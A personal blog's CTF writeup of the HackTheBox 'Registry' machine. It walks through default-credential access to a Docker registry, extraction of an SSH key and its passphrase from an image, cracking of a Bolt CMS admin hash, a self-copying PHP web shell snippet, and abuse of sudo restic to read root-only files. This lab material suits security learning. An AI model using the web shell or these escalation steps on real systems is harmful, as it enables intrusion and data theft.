---
title: "HackTheBox: Registry Writeup"
date: 2020-05-15 11:30:00
tags: ["HackTheBox", "CTF", "Writeup", "Docker", "Bolt", "CMS", "Restic", "Pentesting", "Linux"]
description: "Writeup for the Registry machine at HackTheBox."
images: []
---

[Registry](https://www.hackthebox.eu/home/machines/profile/213) is a vulnerable Linux machine hosted over at [HackTheBox](https://www.hackthebox.eu/) with a difficulty rating of 5.7 out of 10. It hosts a Docker registry with lack of proper authentication. Login credentials can be found looking into a Docker image that can be pulled from said registry. From there, the path to root incorporates tricking a CMS into uploading a web shell and using a backup utility to get access to files that wouldn't normally be accessible by anyone.  

<!--more-->

### Enumeration

The initial portscan reveals your typical targets: SSH and nginx as a webserver. What's interesting is that the SSL certificate is valid for the URL `docker.registry.htb`. I had already worked a couple of times with Docker before and my first guess at this point is that there's probably a Docker registry running on that machine. I added both `registry.htb` and `docker.registry.htb` to my hosts file and kept digging.

```text
kali@kali:~/HTB/machines/registry$ sudo nmap -sC -sV -sT -oA scan 10.10.10.159
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-14 08:14 EST
Nmap scan report for 10.10.10.159
Host is up (0.047s latency)
Not shown: 996 closed ports
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp   open     http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp  open     ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
4444/tcp filtered krb524       
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The webserver shows the standard nginx installation page. A short dirbust reveals that there is a `.bash_history` file that I don't have access to though. Furthermore, there is an `install` directory which, when visited, sends binary data back to the client. I saved the content to examine at a later time.

My next step was to verify if there actually is a Docker registry running on the machine. The [registry documentation](https://docs.docker.com/registry/spec/api/) reveals that it exposes a simple HTTP API. One of its endpoints is `/v2` which should return some basic info about the registry running on the machine.

```text
kali@kali:~$ curl http://docker.registry.htb/v2/ -v
...
< HTTP/1.1 401 Unauthorized
< Www-Authenticate: Basic realm="Registry"
...
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}
```

I took this as a partial success. There is definitely a Docker registry running but with no means of authenticating myself just yet. Regardless, I had a new path to investigate.

### Insecure Docker registry

The documentation points out that the registry returns a `WWW-Authenticate` header with information on how I'm meant to authenticate. However I was successful after trying some basic username and password combinations. Using `admin:admin` is enough to be able to use the API. My next step was to list all available images. The `/v2/_catalog` endpoint achieves just that.

```text
kali@kali:~$ curl http://docker.registry.htb/v2/_catalog -H "Authorization: Basic $(echo -n "admin:admin" | base64)"
{"repositories":["bolt-image"]}
```

After installing Docker on my local machine and trying to connect to the registry, I found that Docker knows better not to trust any rogue registry. Any attempts to connect to an insecure registry are ignored by default. However by listing the registry in the [Docker daemon configuration file](https://docs.docker.com/registry/insecure/) and marking it as insecure, I could convince Docker to still let me connect to it. This means I could now pull the `bolt-image`, run it and get a shell to look at what its purpose is.

```text
kali@kali:~$ docker login -u admin -p admin docker.registry.htb
kali@kali:~$ docker pull docker.registry.htb/bolt-image
kali@kali:~$ docker run -it docker.registry.htb/bolt-image sh
```

My first thought was to check the directory of the root user. And in fact, I found a SSH keypair which could potentially allow me to SSH into the machine.

```text
# pwd
/root/.ssh
# ll
total 24
drwxr-xr-x 2 root root 4096 May 25  2019 .
drwx------ 1 root root 4096 May 25  2019 ..
-rw-r--r-- 1 root root   60 May 25  2019 config
-rw------- 1 root root 3326 May 25  2019 id_rsa
-rw-r--r-- 1 root root  743 May 25  2019 id_rsa.pub
-rw-r--r-- 1 root root  444 May 25  2019 known_hosts
```

I copied the private SSH key so I can let John loose, but without success. No passphrase found in a reasonable amount of time. So the search continues. There is another file located in `/root`, namely `.viminfo`. Text editors occasionally store information about recently edited files, so I was likely to find something useful in there.

```text
# pwd
/root
# cat .viminfo

... /etc/profile.d/01-ssh.sh
```

It contains a path to a script that is used to SSH into the machine. Furthermore, it holds the passphrase of the previously obtained private SSH key in plain text. That also explains why John couldn't figure out the passphrase in time.

```text
# cd /etc/profile.d
# cat 01-ssh.sh
...
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

So now I had all the ingredients to attempt to SSH into the machine. The attempt succeeded and I found myself logged in as user `bolt` on the machine. I obtained the user flag and went from there.

```text
kali@kali:~/HTB/machines/registry$ ssh -i id_rsa -l bolt registry.htb
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)
...
bolt@bolt:~$ id
uid=1001(bolt) gid=1001(bolt) groups=1001(bolt)
bolt@bolt:~$ ls -al
total 32
drwx------ 7 bolt bolt 4096 Feb 14 15:02 .
drwxr-xr-x 3 root root 4096 Oct  8 21:00 ..
lrwxrwxrwx 1 bolt bolt    9 May 26  2019 .bash_history -> /dev/null
drwx------ 3 bolt bolt 4096 Sep 27 09:17 .cache
drwxrwxr-x 3 bolt bolt 4096 Feb 14 15:02 .config
drwx------ 3 bolt bolt 4096 Feb 14 15:20 .gnupg
drwxrwxr-x 3 bolt bolt 4096 Sep 27 09:17 .local
drwx------ 2 bolt bolt 4096 Feb 14 15:21 .ssh
-r-------- 1 bolt bolt   33 Sep 26 21:09 user.txt
bolt@bolt:~$ cat user.txt
ytc0y###########################
```

### Moving laterally

During enumeration, I found that the machine seems to block any outbound network traffic. This means I couldn't make the remote machine initiate any communication to my local machine, but everything the other way around would still work. This is just something to keep in mind while considering the actions taken in this writeup.

I found no obvious paths going straight to the root user, so I instead investigated the webserver's configuration files. The webserver is configured to serve content from the `/var/www/home/bolt` directory if any requests are made against the `/bolt` path. There is also a configuration entry for `/bolt/bolt` which I made sure to check out later. Interestingly, it is also configured to deny any requests made to a particular database file. Reeks of credentials.

```text
server {
    ...
    root /var/www/html;
    index index.php index.html; 

    server_name registry.htb;

    location = /bolt/app/database/bolt.db {
        deny all;
        return 404;
    }

    location = /bolt/bolt {
        try_files               $uri $uri/ /bolt/index.php?$query_string;
    }

    location ^~ /bolt/bolt/ {
        try_files                     $uri /bolt/index.php?$query_string;
    }

    location ^~ /bolt/(.*)$ {
        try_files               $uri $uri/ /bolt/index.php?$query_string;
    }
    ...
}
```

Going to `registry.htb/bolt` shows a simple portfolio. Nothing stands out in particular. However, entering `registry.htb/bolt/bolt` prompts a username and a password and this is where I first encountered the CMS running on the webserver. The website is built using Bolt CMS. The [documentation](https://docs.bolt.cm/3.7/configuration/introduction) reveals that it uses SQLite to store credentials by default. This was confirmation for me that the path to the `bolt.db` file I found earlier points to credentials that'll allow me to log in somehow. So I pulled the database file onto my local machine for further examination.

Any SQLite database viewer will work to look at its contents. The database contains a table called `bolt_users` that lists all users and their hashed passwords. There is only one entry for the user `admin`. The prefix of the password hash reminded of [Bcrypt](https://en.wikipedia.org/wiki/Bcrypt), so I let John do the dirty work of figuring out the password.

```text
kali@kali:~/HTB/machines/registry$ john --wordlist=/usr/share/wordlists/rockyou.txt --rules --format=bcrypt admin.hash
```

John was successful and found `admin:strawberry`. Entering it into the CMS login panel allowed me to access the admin dashboard. If there's a CMS, then there's a place to upload files for content. And indeed there is. All uploaded files to be used as static content can be accessed via `registry.htb/files` in the browser, or `/var/www/html/bolt/files` on the machine. Testing the upload mechanism with some simple text files revealed a problem though. All uploaded files are wiped periodically after approximately 30 seconds. Furthermore, attempts to upload PHP files fail.

The latter can be tackled pretty easily by heading into the main CMS configuration file and adjusting the `accept_file_types` option to also allow PHP files. The configuration file explicitly states that PHP files will not be allowed even if they are listed as accepted, but for some reason that's just not true. I could easily upload PHP files, granted I stuck to the short timing window I hinted at earlier. All configuration files are reset along with the upload folder so it's all just a matter of timing.

The former requires some creativity to circumvent. I decided to refresh my PHP a little and write a custom web shell. It is self-aware in a sense that if I access it in my browser after uploading it to the `files` directory, it copies itself to a more stable location. You can find the code to accomplish that below. If you want to have a look at the entire web shell, you can find the source code in my [CTF snippet repository](https://github.com/JoogsWasTaken/ctf-snippets/tree/master/HTB/Registry).

```php
<?php
    if (basename(__FILE__) == "cpshell.php") {
        if (copy("/var/www/html/bolt/files/cpshell.php", "/var/www/html/shell.php")) {
            system("chmod u+s /var/www/html/shell.php");
            echo("Copied successfully.");
        } else {
            echo("Copy failed.");
        }
        
        exit();
    }
    // web shell stuff
?>
```

Now by navigating to `registry.htb/shell.php` in my browser, I could access my web shell and be sure that it persisted for a bit longer. I could now issue commands as the web user and this time, there was a clear way to escalating privileges.

{{< figure src="/images/htb/registry/www-root.png" alt="Custom web shell running id to check identity" caption="Using the web shell to verify web user" >}}

{{< figure src="/images/htb/registry/sudo.png" alt="Custom web shell running sudo -l to check sudo privileges" caption="Investigating sudo privileges as the web user" >}}

Nothing beats a proper reverse shell though, and fortunately `ncat` is present on the machine which is more than just convenient. Now I was able to investigate what I can accomplish using the web user.

```text
kali@kali:~$ nc registry.htb 4242
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Backing it up

As shown earlier, there is an interesting binary that I can execute with `sudo` as the web user: `/usr/bin/restic`. [Restic](https://restic.net/) is a backup utility. It allows its users to create backups of files and directories and stores them in repositories so they can be restored later at any time. Repositories can be just a backup directory on the file system or a remote server. [There's a wide variety of options, really](https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html).

The output of the `sudo -l` command shows that I'm allowed to call the `restic` binary to create backups. The only condition is that the specification of the target repository needs to start with `rest`. Then I should be able to create backups of files and directories that only the root user would be allowed to access. Reading through the documentation, there's only two options: a directory on the file system or a REST server. The former does allow me to create backups into an appropriately named directory, but doesn't allow me to access the backup since it's owned by the root user. So onto the latter.

Compiling [REST server](https://github.com/restic/rest-server) yields a single binary. I used `scp` to get it onto the machine as user `bolt`.

```text
scp -i id_rsa rest-server/rest-server bolt@registry.htb:~
```

The plan was to host a REST server instance as `bolt`, run the backup command as the web user and specify the REST server as the target repostory. Finally I could restore the backup as the `bolt` user since the server owner also owns any data that has been sent to their server.

```text
bolt@bolt:~/tmp$ ./rest-server --no-auth --listen :8008 --path data
Data directory: data
Authentication disabled
Private repositories disabled
Starting server on :8008
```

```text
www-data@bolt:~/html/tmp$ sudo /usr/bin/restic backup -r rest:http://0.0.0.0:8008 /root/root.txt
enter password for repository: a

password is correct
found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root/root.txt]
scanned 0 directories, 1 files in 0:00
[0:00] 100.00%  33B / 33B  1 / 1 items  0 errors  ETA 0:00 
duration: 0:00
snapshot 6bf74b4e saved
```

```text
bolt@bolt:~/tmp$ ./rest-server --no-auth --listen :8008 --path data
Data directory: data
Authentication disabled
Private repositories disabled
Starting server on :8008

bolt@bolt:~/tmp$ restic restore latest -r data --target out
enter password for repository: 
password is correct
restoring <Snapshot 6bf74b4e of [/root/root.txt] at 2020-02-15 15:15:42.928698607 +0000 UTC by root@bolt> to out
ignoring error for /root.txt: Lchown: lchown /home/bolt/tmp/out/root.txt: operation not permitted
There were 1 errors
bolt@bolt:~/tmp$ cd out
bolt@bolt:~/tmp/out$ cat root.txt
ntrkz###########################
```

And there's the root flag. Keep in mind that if I can create a backup of the root flag file, I can create a backup of virtually any file on the machine that I normally wouldn't be allowed to access.

### Conclusion

I very much enjoyed this box. It kept me on my toes by blocking any network traffic coming from the box itself and forced me to think differently about my usual pentesting strategies. Docker is a technology that I already use quite frequently, so I didn't find the initial foothold too difficult to exploit. The path to the root user contained a couple pitfalls, but mostly due to misunderstandings on my behalf. In the end, the box felt more like a medium-rated one to me but that's probably due to my familiarity with the technologies used. Thanks to [thek](https://www.hackthebox.eu/home/users/profile/4615) for the box and anyone else who helped me on my way to root.